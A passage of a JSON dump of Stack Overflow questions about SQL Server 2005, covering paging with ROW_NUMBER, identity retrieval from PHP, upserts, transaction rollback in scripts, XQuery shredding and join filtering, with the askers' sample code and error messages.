\nINTO [destination server].[destination database].[dbo].[destination table] \nFROM [source server].[source database].[dbo].[source table]\n</code></pre>\n\n<p>But I get error :</p>\n\n<blockquote>\n  <p>Object contains more than the maximum number of prefixes. Maximum is\n  2.</p>\n</blockquote>\n\n<p>Can someone please point me to the right solution to my problem?</p>\n"},{"tags":["tsql","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":106,"score":-1,"question_id":10777641,"title":"Convert sql to view in stored procedure then return limited rows","body":"<p>I need to compare two tables and then filter out only those records that do not have a matching record.\nI then need to return only a few of those rows.\nTo return rows I use...</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>SELECT  *\n    FROM     (SELECT  ROW_NUMBER() OVER (ORDER BY Orderby ASC)\n                 AS Row, * FROM vImportFiltered where userid &lt;&gt; @userID)\n                AS vImport\n    WHERE  Row &gt;= @NumbFrom AND Row &lt;= @NumbTo\n</code></pre>\n\n<p>For the filter of records I use... </p>\n\n<p>SELECT\n        *\n    FROM\n        ImportProducts IP Where IP.ImpProdNameID = @impProdNameID and IP.ImpProdCatID = @ImpProdCatID and</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>  NOT EXISTS (SELECT *\n\n           FROM   dbo.ProductDetails PD INNER JOIN\n                      dbo.ProductsLU PL ON PD.LUProdSellUseID = PL.LUProdSellUseID\n        WHERE\n           IP.ImpProductID = PD.ProdImpID AND\n           (CONVERT(varchar(36),PL.UserID) = @userID))\n</code></pre>\n\n<p>Both work separately but when I try to combine them I get errors.</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>SELECT\n    *\nFROM\n  (SELECT  ROW_NUMBER() OVER (ORDER BY Orderby ASC)\n                 AS Row, * ImportProducts IP Where IP.ImpProdNameID = @impProdNameID and IP.ImpProdCatID = @ImpProdCatID \nand    \n      NOT EXISTS (SELECT *\n\n           FROM   dbo.ProductDetails PD INNER JOIN\n                      dbo.ProductsLU PL ON PD.LUProdSellUseID = PL.LUProdSellUseID\n        WHERE\n           IP.ImpProductID = PD.ProdImpID AND\n           (CONVERT(varchar(36),PL.UserID) = @userID)) as vImport\nWHERE  Row &gt;= @NumbFrom AND Row &lt;= @NumbTo\n</code></pre>\n\n<p>Errors:</p>\n\n<pre><code>Msg 102, Level 15, State 1, Line 17 \nIncorrect syntax near 'ImportProducts'. \nMsg 156, Level 15, State 1, Line 25 \nIncorrect syntax near the keyword 'as'.\n</code></pre>\n\n<p>I've also tried</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>WHERE\n           IP.ImpProductID = PD.ProdImpID AND\n           (CONVERT(varchar(36),PL.UserID) = @userID))And Row &gt;= @NumbFrom AND Row &lt;= @NumbTo\n</code></pre>\n\n<p>What am I doing wrong?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":895,"score":1,"question_id":6850375,"title":"Retrieve the ID of an inserted record: Php & MS SQL SERVER","body":"<blockquote>\n  <p>This question relates to:</p>\n  \n  <p>PHP Version 5.3.6</p>\n  \n  <p><a href=\"http://msdn.microsoft.com/en-us/library/cc296170%28v=sql.90%29.aspx\" rel=\"nofollow\">Microsoft Drivers for PHP for SQL Server</a></p>\n</blockquote>\n\n<p>I am trying to properly retrieve the ID of a record insert using a combination of PHP and SQL Server 2005 or 2008.</p>\n\n<p>This question assumes the existence of the following table:</p>\n\n<p><code>CREATE TABLE users([id] [int] IDENTITY(1,2) NOT NULL,[username] [varchar](50) NOT NULL,[password] [varchar](40) NOT NULL,[first_name] [varchar](30) NOT NULL,[last_name] [varchar](30) NOT NULL)</code></p>\n\n<p>If I were to run the following query in Management Studio or via ASP (Classic), a record would be inserted and an ID would be returned, but the same behavior does not seem to exist with PHP and this driver.</p>\n\n<p><code>INSERT INTO users  (username, password, first_name, last_name) VALUES ('x','x','x','x')  ; SELECT @@IDENTITY ;</code></p>\n\n<p>I need help figuring out how to properly pull an ID either by chaining SQL statements together or by any other method.</p>\n\n<p>I have worked up some code.</p>\n\n<p>Variation 1 is a simple select (via query) - no insertion or ID retrieveal performed</p>\n\n<p>Variation 2 is a chained SQL statement which inserts the new record properly, but does not return the ID</p>\n\n<p>Variation 3 uses (execute) instead of (query). The record is inserted, but the ID is not returned. This one generated an error because sqlsrv_execute returns true/false instead of a recordset.</p>\n\n<p>So how can I modify my code to insert a record and retrive an ID? (I'm working on the assumption that the answer to this question will extend to Stored Procedures that return data as well, but perhaps that is not the case)</p>\n\n<p>Thank you.</p>\n\n<pre><code>// Database connection\n// -------------------------------------------------------------------------------------------------------\n$conn = sqlsrv_connect(DB_SERVER,array(\"UID\" =&gt; DB_USER, \"PWD\" =&gt; DB_PASSWORD, \"Database\"=&gt; DB_NAME ));\n\n// Variation 1, straight select\n// -------------------------------------------------------------------------------------------------------\n$sql = \"SELECT * FROM users;\";\n$result = sqlsrv_query($conn,$sql);\n$row = sqlsrv_fetch_array($result);\n\n// Variation 2, Insert new record and select @@IDENTITY\n// -------------------------------------------------------------------------------------------------------\n$sql = \"INSERT INTO users  (username, password, first_name, last_name) VALUES ('x','x','x','x')  ; SELECT @@IDENTITY ;\";\n$result = sqlsrv_query($conn,$sql);\n$row = sqlsrv_fetch_array($result);\n\n// Variation 3, using EXECUTE instead of QUERY\n// -------------------------------------------------------------------------------------------------------\n//$sql = \"INSERT INTO users  (username, password, first_name, last_name) VALUES ('x','x','x','x')  ; SELECT @@IDENTITY as id ;\";\n$sql = \"INSERT INTO users  (username, password, first_name, last_name) VALUES ('x','x','x','x')  ; SELECT SCOPE_IDENTITY() as id ;\";\n\n$stmt = sqlsrv_prepare( $conn, $sql);\n$result = sqlsrv_execute($stmt);\n$row = sqlsrv_fetch_array($result);\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":204,"score":2,"question_id":11017678,"title":"SQL Server compare results of two queries that should be identical","body":"<p>I am modifying a sql server 2005 stored procedure slightly for performance, and I would like to quickly make sure the old stored proc and the new one return the exact same results (the columns are the same, I want to make sure the rows are the same). </p>\n\n<p>Is there a simple way to do this in sql server 2005?</p>\n"},{"tags":["sql-server","sql-server-2005","sqlcmd"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":921,"score":1,"question_id":3747006,"title":"sql scripting variable default value","body":"<p>I have a script file e.g. test.sql.  I want to call this from another script, say caller.sql, in sqlcmd mode using :r test.sql.  This works fine, but I want to use a scripting variable in test.sql.  When I call test.sql from caller.sql I can set the scripting variable and all is well.  However, I want to use a default value for the scripting value so that if the caller does not set the variable, or if I run test.sql directly (not from caller.sql) then the scripting variable defaults to a set value.</p>\n\n<p>I have tried things such as </p>\n\n<pre><code>begin try\n select '$(grip)'\n select 'grip value was found'\nend try\nbegin catch\n select 'grip value was missing'\nend catch\n</code></pre>\n\n<p>but I just get the following message:\nA fatal scripting error occurred.\nVariable grip is not defined.</p>\n\n<p>What do I need in test.sql so that it can cope with 'grip' either being passed by the caller or not?  I am using MS SQL 2005</p>\n"},{"tags":["sql-server-2005","tsql","find-and-replace"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":377,"score":2,"question_id":3353412,"title":"Textual find and replace within an XML column","body":"<p>I'm trying to find and replace all instances of 'this phrase' with 'that phrase' in an xml type column using T-SQL.</p>\n\n<p>The xml column contains fields that are more than 8000 characters long.</p>\n\n<p>I tried using the <code>Replace</code> function but it doesn't like the XML data type, and the data can't be squeezed into a varchar.</p>\n"},{"tags":["sql","query","sql-server-2005","index"],"answer_count":1,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":105,"score":5,"question_id":11016935,"title":"How can I force a query to not use a index on a given table?","body":"<p>I'm currently doing some testing to determine the performance implications of including an index on a given column in SQL Server 2005.</p>\n\n<p>The test data set I'm using has approximately ~72 million rows (about 6 GB of data). In order to actually <em>test</em> the performance of the index I need to be able to compare the performance with and without the index there.</p>\n\n<p>That's all well and fine, but creating an index in the first place is not a cheap operation. If I want to test the table without the index, I need to, at the very least, disable the index. To test with the index I need to re-enable it which takes quite a long time.</p>\n\n<p>Is there any way that I can force SQL Server 2005 to ignore a given index when it's executing a query? I don't want to have to disable the index just to test a query since it takes such a long time to disable the index.</p>\n"},{"tags":["asp.net","sql-server-2005","database-connection","ssms"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":865,"score":0,"question_id":11014145,"title":"How to store a multi-line text in sql server 2005 using SSMS?","body":"<p>I got similar questions to this but not get satisfied answers. I want to store paragraph in table in sql server 2005. I tried all data types (nvarchar, varchar, text etc.) but when I copy the content, it store only 1st line. Help me.</p>\n\n<p>I am using Sql Server Management Studio and directly copy paste the content into table. And for retrieving I use this code.</p>\n\n<pre><code>String query2 = String.Format(\"select data from try where roll=55\");\nSqlCommand cmd2 = new SqlCommand(query2, conn);\nSqlDataReader reader2 = cmd2.ExecuteReader();\nif (reader2.Read())\n    {\n        Label1.Text = reader2.GetValue(0).ToString();\n\n    }\n</code></pre>\n\n<p>where 'data' is multiline content.</p>\n"},{"tags":["sql-server-2005","query","select","large-data-volumes"],"answer_count":4,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":893,"score":1,"question_id":1874888,"title":"Select Count(*) over large amount of data","body":"<p>I want to do this for a Report but i have 20,000,000 of records in my table and it causes an TimeOut in my application.</p>\n\n<pre><code>SELECT\n        T.transactionStatusID,\n        TS.shortName AS TransactionStatusDefShortName,\n        count(*) AS qtyTransactions\n    FROM\n        Transactions T \n\n    INNER JOIN TransactionTypesCurrencies TTC\n                ON  T.id_Ent = TTC.id_Ent\n                    AND T.trnTypeCurrencyID = TTC.trnTypeCurrencyID\n            INNER JOIN TransactionStatusDef TS\n                ON  T.id_Ent = TS.ent_Ent\n                AND T.transactionStatusID = TS.ID\nWHERE\n    T.id_Ent = @id_Ent\nGROUP BY\n        T.transactionStatusID,\n        TS.shortName\n</code></pre>\n\n<p>as far as i know COUNT(*) causes a full table scan and it makes my query to take too much time, im Using MS SQL 2005, any help ?</p>\n\n<h3>Edit:</h3>\n\n<p>The project leader tells me that the Query is just for one day it could help?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":11013575,"title":"SQL: partial group by","body":"<p>Here's what my table <code>TheTable</code> looks like</p>\n\n<pre><code>ColA  | ColB  | ColC\n------+-------+------\nabc   | 2005  | item7\nabc   | 2010  | item3\ndef   | 2009  | item2\ndef   | 2010  | item4\ndef   | 2011  | item5\ndef   | 2012  | item1\n</code></pre>\n\n<p>And I want to write a query to return this result:</p>\n\n<pre><code>ColA  | ColB  | ColC\n------+-------+------\nabc   | 2010  | item3\ndef   | 2012  | item1\n</code></pre>\n\n<p>I ended up with:</p>\n\n<pre><code>SELECT TheTable.ColA,TheTable.ColB,TheTable.ColC\nFROM TheTable,(SELECT ColA a,MAX(ColB) b FROM TheTable GROUP BY ColA) t\nWHERE t.a=TheTable.ColA AND t.b=TheTable.ColB\n</code></pre>\n\n<p>But I'm not sure this kind of nested query is very efficient. So the question is, is there a better way? </p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":10991360,"title":"How to get database dump from sql server 2005","body":"<p>I have SQL Server 2005 and I am looking for a way to take a database dump </p>\n\n<p>Set of create INSERT statements that reflects the database,</p>\n\n<p>thanks in advance...</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":219,"score":2,"question_id":11010511,"title":"How to upsert (update and insert) in SQL Server 2005","body":"<p>I have table in which I am inserting rows for employee but next time when I want to insert row I don't want to insert again data for that employee just want to update with required columns if it exits there if not then create new row</p>\n\n<p>How can we do this in SQL Server 2005?</p>\n\n<p>I am using jsp</p>\n\n<p>my query is</p>\n\n<pre><code>String sql=\"insert into table1(id,name,itemname,itemcatName,itemQty)values('val1','val2','val3','val4','val5')\";\n</code></pre>\n\n<p>if it's first time then insert it into database else if exists update it</p>\n\n<p>how to do?</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":112,"score":0,"question_id":4342835,"title":"SQL Server - Dynamic Management Views question","body":"<p>I am trying to find out the Dynamic Management Views that will give the following information for SQL Server 2005.</p>\n\n<ol>\n<li>The table that undergone Full Table Scan</li>\n<li>The query that caused the table to undergo Full Table Scan</li>\n<li>Time of Scan</li>\n<li>Time taken for completing the scan</li>\n<li>Number of records returned by the query </li>\n<li>Total Number of records in the table at the time of scan.</li>\n</ol>\n\n<p>I tried in some of the DMV articles but could not figure out the required DMV query.\nIf it is impossible to achieve in SQL Server 2005, can you please provide 2008 version of this?</p>\n\n<p>Thanks</p>\n\n<p>Lijo Cheeran Joseph</p>\n"},{"tags":["asp.net","sql-server-2005","c#-2.0"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":11009071,"title":"LIKE works partially to search char from data base in SQL Server 2005","body":"<p><code>tbSearch.Text</code> is a text box value on the page and <code>searchText</code> is string data type value received at drop down list box selected index change event.</p>\n\n<p>I receive both value perfectly from the text box and drop down list box, but I am unable to search data from the table.</p>\n\n<p>Stored procedure:</p>\n\n<pre><code>ALTER PROCEDURE showData\n@search varchar(MAX)=NULL,\n@status varchar(50)=NULL\nAS\nBEGIN   \n    if @status = 'LANDLINE' and @search != ''\n    BEGIN\n       SELECT c.contid    AS ID, \n          c.contname  AS Person, \n          b.bustype   AS Business, \n          c.comp      AS Company, \n       c.email1    AS Email, \n       c.email2    AS Email, \n       c.website   AS Website, \n       c.landline1 AS Landline, \n       c.landline2 AS Landline, \n       c.mobile1   AS Mobile, \n       c.mobile2   AS Mobile, \n       c.street    AS Street, \n       c.city      AS City, \n       c.zip       AS ZipCode, \n       c.state     AS State, \n       c.country   AS Country \n    FROM   contactinfo c \n       LEFT OUTER JOIN businessinfo b \n                    ON c.bustype = b.bustype \n    WHERE  c.landline1 LIKE '%' + @search + '%' \n        OR c.landline2 LIKE '%' + @search + '%' \n   END\nEND\nRETURN\n</code></pre>\n\n<p>Calling C# code:</p>\n\n<pre><code>protected void btSearch_Click(object sender, EventArgs e)\n{\n    DataSet ds = new DataSet();\n\n    cmd = new SqlCommand(\"showData\", con);\n    cmd.CommandType = CommandType.StoredProcedure;\n    cmd.Parameters.AddWithValue(\"@search\", tbSearch.Text);\n    cmd.Parameters.AddWithValue(\"@status\", searchText);\n\n    da = new SqlDataAdapter(cmd);\n    ds.Clear();\n    da.Fill(ds);  \n\nGridViewSearch.Visible = true;\n    GridViewSearch.DataSource = ds.Tables[0];\n    GridViewSearch.DataBind();\n}\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":110,"score":1,"question_id":11002972,"title":"Filtering Nulls from multiple columns","body":"<p>Using SQL Server 2005.</p>\n\n<p>Data is in 2 separate tables and I have only been given write permissions.</p>\n\n<p>Data looks like:</p>\n\n<pre><code>DateTime1  |  DateTime2\n-----------------------\n2012-06-01 | 2012-06-01\n2012-06-02 | 2012-06-02\n2012-06-04 | 2012-06-05\n2012-06-02 | NULL\nNULL       | 2012-06-05\n2012-06-04 | 2012-06-05\nNULL       | NULL\n</code></pre>\n\n<p>What I am trying to do is be able to count values in which DateTime1 and DateTime2 contain values, DateTime1 contains a date and DateTime2 is NULL, DateTime1 is NULL and DateTime2 contains values.</p>\n\n<p>Overall Im trying to avoid DateTime1 being Null and DateTime2 being null.</p>\n\n<p>My <strong><em>where</em></strong> statement looks like this:</p>\n\n<pre><code>Where (DateTime1 is not null or DateTime2 is not null)\n</code></pre>\n\n<p>The only problem is it is still showing where both are null values. Anyone know why this might be happening or how to solve it?</p>\n\n<p>Thanks</p>\n\n<p><strong>EDIT</strong>\nFull Query as requested by @Lamak</p>\n\n<pre><code>;With [CTE] As (\nSelect\n    TH.ID\n    ,AMT\n    ,Reason\n    ,EffDate\n    ,DateReq\n    ,CS_ID\n    ,ROW_NUMBER()\n        Over (Partition By ID Order By [pthPrimeKey] Desc) as [RN]\nFrom\n    DateTime1Table as [MC] (nolock)\n    Left Join History as [TH] (nolock) on [TH].[ID] = [MC].[ID]\n    Left Join Trans as [SUB] (nolock) on [SUB].TransactionReasonCode = [TH].Reason\n    Left Join Renew as [RM] (nolock) on [MC].ID = [RM].ID\nWhere \n    ([MC].[DateTime1] is not null or [RM].[DateTime2] is not null)\n    And [PostingDate] = DATEADD(dd, datediff(dd, 1, GetDate()),0)\n)\nSELECT \n[ID]\n,[AMT] as [Earned]\n,[Reason] as [Reason]\n,[EffDate] as [Eff]\n,[DateReq] as [Date_Cancel_Req]\n,[pthUserId_Number] as [CSR]\nFROM [CTE]\nWhere RN &lt;= 1\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","tsql","transactions"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":3051,"score":2,"question_id":2911103,"title":"Exit and rollback everything in script on error","body":"<p>I have a TSQL script that does a lot of database structure adjustments but it's not really safe to just let it go through when something fails.</p>\n\n<p>to make things clear:</p>\n\n<ul>\n<li>using MS SQL 2005</li>\n<li>it's NOT a stored procedure, just a script file (.sql)</li>\n</ul>\n\n<p>what I have is something in the following order</p>\n\n<pre><code>BEGIN TRANSACTION\n    ALTER Stuff\n    GO\n\n    CREATE New Stuff\n    GO\n\n    DROP Old Stuff\n    GO\nIF @@ERROR != 0\n    BEGIN\n  PRINT 'Errors Found ... Rolling back'\n  ROLLBACK TRANSACTION\n  RETURN\n    END\nELSE\n     PRINT 'No Errors ... Committing changes'\n     COMMIT TRANSACTION\n</code></pre>\n\n<p>just to illustrate what I'm working with ... can't go into specifics\nnow, the problem ...</p>\n\n<p>When I introduce an error (to test if things get rolled back), I get a statement that the ROLLBACK TRANSACTION could not find a corresponding BEGIN TRANSACTION.\nThis leads me to believe that something when REALLY wrong and the transaction was already killed.\nwhat I also noticed is that the script didn't fully quit on error and thus DID try to execute every statement after the error occured. (I noticed this when new tables showed up when I wasn't expecting them because it should have rollbacked)</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":52,"score":0,"question_id":10993329,"title":"Did not receive expected results when using LEFT JOIN?","body":"<p>I have the following SQL statement, and it returns only 2 records even though I have 300 employees. Does anyone see what I could be doing wrong?</p>\n\n<pre><code>SELECT     Employees.[Employee ID], \nEmployees.Employee, \nEmployees.[First Name], \nEmployees.[Middle Name], \nEmployees.[Last Name], \nEmployees.Position,\n[Work].[Work ID]\nFROM  Employees LEFT JOIN\n[Work] ON Employees.[Employee ID] = [Work].[Employee ID]\nWHERE [Work].[Work Date] = '06-13-2012'\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":11001818,"title":"Uploading Data For A New Column In MSSQL","body":"<p>I've added a new column to a database and want to populate it from a spreadsheet.  Is there an  easy query that will grab the data out based on another column in the spreadsheet that matches the one in the database?</p>\n\n<p>Thanks</p>\n"},{"tags":["xml","tsql","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":187,"score":1,"question_id":11002063,"title":"xquery equivalent of tsql where clause within XML nodes","body":"<p>I'm trying to shred XML files that have an unusual layout, because items are not arranged with conventional elements and attributes, but instead in a kind of \"list within the xml\" format: </p>\n\n<pre><code>&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt; \n&lt;SOAP-ENV:Body&gt; \n&lt;ns:Lists xmlns:ns=\"urn:Listing\"&gt; \n    &lt;ns:items&gt;\n      &lt;ns:listRef&gt;List1&lt;/ns:listRef&gt; \n      &lt;ns:name&gt;Test list items&lt;/ns:name&gt; \n      &lt;ns:extendedFields&gt;\n         &lt;ns:extendedField&gt;\n             &lt;ns:name&gt;Fruit&lt;/ns:name&gt; \n             &lt;ns:data&gt;Apple&lt;/ns:data&gt; \n      &lt;/ns:extendedField&gt;\n      &lt;ns:extendedField&gt;\n             &lt;ns:name&gt;Vegetable&lt;/ns:name&gt; \n              &lt;ns:data /&gt; \n      &lt;/ns:extendedField&gt;\n      &lt;ns:extendedField&gt;\n              &lt;ns:name&gt;Sweet&lt;/ns:name&gt; \n             &lt;ns:data&gt;Crunchie&lt;/ns:data&gt; \n      &lt;/ns:extendedField&gt;\n    &lt;/ns:extendedFields&gt;\n    &lt;/ns:items&gt;\n&lt;/ns:Lists&gt;\n&lt;/SOAP-ENV:Body&gt;\n&lt;/SOAP-ENV:Envelope&gt;\n</code></pre>\n\n<p>I've tried variations of the XQuery below, but am not getting it right. What I need to do is the Xpath equivalent of \"select ns:data from x where ns:name = 'Fruit'\" for example. In the past I was able to do this using singleton numbering to point to the location of the bit that I wanted on the tree, but in this case the number of extendedFields is variable, and the sequence changes, so the only way to get to the node you want will be to specify the name/value pair that you want.  </p>\n\n<pre><code>DECLARE @x xml \n SET @x = \n(   SELECT xml_data_column   \n   FROM dbo.Table   \n WHERE xmlFileName = 'D:\\XML_list.xml'); \n\n;WITH XMLNAMESPACES('urn:Listing' AS ns) \nSELECT t.c.value('../ns:listRef[1]', 'varchar(20)') listRef  \n, t.c.value('../ns:name[1]', 'varchar(20)') name  \n, t.c.value('/.', 'varchar(30)') ext1b\n, t.c.value('ns:extendedField[1]/ns:name[1]', 'varchar(30)') name1\n, t.c.value('ns:extendedField[1]/ns:data[1]', 'varchar(30)') data1\n, t.c.value('ns:extendedField[2]/ns:name[1]', 'varchar(30)') name2\n, t.c.value('ns:extendedField[2]/ns:data[1]', 'varchar(30)') data2\n, t.c.value('ns:extendedField[3]/ns:name[1]', 'varchar(30)') name3\n, t.c.value('ns:extendedField[3]/ns:data[1]', 'varchar(30)') data3\nFROM  @x.nodes('//ns:Lists/ns:items/ns:extendedFields[1]') AS t(c)\n</code></pre>\n\n<p>So if I wanted to see what fruit item this person opted for, then I would want the output to look like: </p>\n\n<pre><code>listRef, name,                Fruit \nList1,   Test list items,   Apple\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":7978,"score":4,"question_id":1114307,"title":"Extracting hours from a DateTime (SQL Server 2005)","body":"<p>I can extract the month and day by using Day(Date()), Month(Date()). I cant extract hours, with HOUR(Date()). I get the following error.</p>\n\n<blockquote>\n  <p>'HOUR' is not a recognized built-in\n  function name.</p>\n</blockquote>\n\n<p>How can I extract hours?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4589,"score":4,"question_id":2529839,"title":"How to make a table Read Only in SQL Server?","body":"<p>I am updating some set of records in that table , after that i need to make this table read only.</p>\n\n<p>So How to make a table Read Only in SQL Server?</p>\n"},{"tags":["c#","sql-server-2005","limitations","sqldependency"],"answer_count":2,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":1215,"score":7,"question_id":7588572,"title":"What are the limitations of SqlDependency","body":"<p>I am using using a table as a message queue and \"signing up\" for up for updates by using a SqlDependency. Everywhere I read people are saying look out for the limitations of it but not specifically saying what they are. From what I've gathered you will have problems when the table has very high update frequency, fortunately I'm only looking at 10 - 20 values per minute maximum. </p>\n\n<p>What are the other limitations/impact on the SqlServer?</p>\n"},{"tags":["sql-server-2005","sql-server-2000"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":10994362,"title":"suser_sname() returning values in different cases in sql server 2000 and sql server 2005","body":"<p>I have a user name 'abc'(user name in small letterS) in both sql server 2000 and sql server 2005.</p>\n\n<p>First I logged in through sql server 2000 by entering user name as 'ABC'. After logging in I ran the query 'SELECT SUSER_SNAME()' and got the result as 'ABC'(in caps)</p>\n\n<p>But if I logged in to Sql server 2005 by entering user name as 'ABC' and run the query 'SELECT SUSER_SNAME()', i got the result as 'abc'(in small letters)</p>\n\n<p>Can anyone please tell why im getting like this in sql server 2005. I need the result in capital letter without changing the above query.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":243,"score":0,"question_id":10990467,"title":"Insert statement with CASE to avoid duplicate row insertion","body":"<p>I have written the below stored procedure for checking for duplicates before inserting the row into the table.</p>\n\n<p>But I cannot write my <code>INSERT</code> statement inside the <code>CASE</code>.</p>\n\n<p>How can I write stored procedure for checking the value of <code>@Ordername</code> and after that if it is not present then it should be inserted into database .</p>\n\n<pre><code>       CREATE PROCEDURE [Test Procedure ]\n          (\n          @section varchar(70), \n          @mark varchar(70),\n          @qty decimal(18,2),\n          @Weight decimal(18,2),\n          @dateupdateremark int,\n          @OrderName varchar(70)\n           )\n          AS\n       BEGIN\n   SET NOCOUNT ON;\n\n       select case(@OrderName)\n       when (select OrderName from dbo.tbl_insertxmldetails \n       where(@OrderName) not in (select OrderName from tbl_insertxmldetails))\n\n       then \n       insert into dbo.tbl_insertxmldetails \n       (Section, Mark, QTY,Weight,Dateupdateremark ,OrderName,SystemDate)\n       values\n       (@Section, @Mark, @QTY,@Weight, @Dateupdateremark,@OrderName,GETDATE())\n       else 'File already Exists'\n end\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":10990497,"title":"SQLServer difference between new login and new database user","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1134319/difference-between-a-user-and-a-login-in-sql-server\">Difference between a User and a Login in SQL Server</a>  </p>\n</blockquote>\n\n\n\n<p>Is it enough to create a database login with permission to desired database? Or do I need to create a database user for this login?</p>\n"},{"tags":["sql","sql-server-2005","join","left-join"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":142,"score":1,"question_id":10976226,"title":"How to get all rows from left table in a join statement?","body":"<p>I have two tables. One is <code>Employee_Mstr</code> and other is <code>EmployeeLeaveRequest_mstr</code>.</p>\n\n<p><img src=\"http://i.stack.imgur.com/mlaD2.png\" alt=\"My data\"></p>\n\n<p>Please help me to achieve this.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql-server-2005","if-statement","case-when"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":117,"score":0,"question_id":10989501,"title":"Using IF logic in where clause","body":"<p>Ok, I have done plenty of research on this topic before asking the question, but to avail considering my specific situation. Currently my code looks like this: </p>\n\n<pre><code>SELECT RTRIM(logtype)+'-'+RTRIM(servicenbr)+'-'+CONVERT(varchar(25), idserv) as CaseNbr, (CASE WHEN tn.TeamText IS NULL THEN 'HELPDESK' WHEN tn.TeamText like '' THEN 'HELPDESK' ELSE tn.TeamText END) as SourceTeam, (tn2.TeamText) as DestinationTeam\n FROM teamnames as tn2\n    LEFT OUTER JOIN caseaudit AS ca\n    ON tn2.teamID = ca.referteamID2\n    LEFT OUTER JOIN openstatus As os\n    ON ca.logno = os.logno\n    LEFT OUTER JOIN teamnames as tn\n    ON ca.referteamid1 = tn.teamid\n WHERE CONVERT(smalldatetime,ca.dModLast,101) BETWEEN '2012-06-04' AND '2012-06-11'\n\n --NEED TO PUT IF CLAUSE HERE\n\n ORDER BY DestinationTeam\n</code></pre>\n\n<p>Specifically, my IF clause, or CASE WHEN, needs to test to see </p>\n\n<pre><code>WHERE ca.asggrp1 &lt;&gt; ca.asggrp2 \nAND ca.referteamid1 &lt;&gt; ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18. \n\nIf they are equal, then the ticket should be ignored UNLESS \nca.asggrp1 = 'CLIENT' AND ca.asggrp2 = 'CLIENT' \nAND ca.referteamid1 &lt;&gt; ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18.\n</code></pre>\n\n<p><em><strong>EDIT:</em></strong> </p>\n\n<p>Alright... let's try this. The query should always pull cases with the limitation:</p>\n\n<pre><code>WHERE ca.referteamid1 &lt;&gt; ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18\n</code></pre>\n\n<p>Also, I want to limit the results to when <code>ca.asggrp1 &lt;&gt; ca.asggrp2</code>, except for when they are both equal to 'CLIENT'</p>\n\n<p><em><strong>EDIT:</em></strong></p>\n\n<p>One more try here... I lost my audience. This is the best explanation I can give of what I am trying to do. </p>\n\n<pre><code>SELECT RTRIM(logtype)+'-'+RTRIM(servicenbr)+'-'+CONVERT(varchar(25), idserv) as CaseNbr, (CASE WHEN tn.TeamText IS NULL THEN 'HELPDESK' WHEN tn.TeamText like '' THEN 'HELPDESK' ELSE tn.TeamText END) as SourceTeam, (tn2.TeamText) as DestinationTeam\n FROM teamnames as tn2\n    LEFT OUTER JOIN caseaudit AS ca\n    ON tn2.teamID = ca.referteamID2\n    LEFT OUTER JOIN openstatus As os\n    ON ca.logno = os.logno\n    LEFT OUTER JOIN teamnames as tn\n    ON ca.referteamid1 = tn.teamid\n WHERE CONVERT(smalldatetime,ca.dModLast,101) BETWEEN '2012-06-04' AND '2012-06-11'\n AND ca.referteamid1 